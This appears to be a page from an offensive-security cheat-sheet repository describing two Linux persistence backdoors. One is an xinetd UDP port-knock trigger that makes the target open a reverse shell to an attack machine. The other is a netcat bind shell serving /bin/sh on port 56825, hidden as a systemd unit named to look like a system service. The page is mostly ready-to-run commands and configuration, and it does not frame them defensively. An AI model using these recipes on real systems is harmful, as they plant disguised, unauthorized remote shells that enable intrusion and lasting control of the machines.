# [Reverse Shells](../../Tools/Shells/Reverse/README.md)

# Xinetd UDP Portknock Backdoor
##### [Step 1 - On Target, create xinetd service](https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56)
[Local File](../../Tools/Shells/Persistence/xinetd/xinetd_server.sh)

It requires that netcat is on the target, in the /bin directory.  It copies netcat to file /bin/services.udp.
##### Step 2 - Start netcat listener on Attack machine
```bash
nc -lnvp <Port #>
```
##### Step 3 - Send a single UDP packet to target, "knocking," and causing the target to establish a reverse shell.
```bash
hping3 -2 -c 1 <Target IP Address> -p 65534
```

### Portknocking References
[Port knocking](https://en.wikipedia.org/wiki/Port_knocking)

# Systemd Netcat Bind Shell
##### Step 1 - On Target, copy netcat to a new file, in /lib/systemd directory.
```bash
cp /bin/nc /lib/systemd/systemd-service
```
##### Step 2 - On Target, create file /lib/systemd/system/systemd-service with following contents
[systemd-service](../../Tools/Shells/Persistence/Systemd/systemd-service)
```bash
[Unit]
Description = Systemd Service
After = network.target
[Service]
ExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh
[Install]
WantedBy = multi-user.target
```
##### Step 3 - On Target, enable & start service
```bash
systemctl enable systemd.service
systemctl start systemd.service
```
##### Step 4 - Confirm that port is listening on the target
```bash
netstat -auntp | grep 56825
```
##### [Step 5 - From Attack machine, establish shell (Note Port # 56825)](../../Tools/Shells/Bind/README.md#Netcat-Bind-Shell)

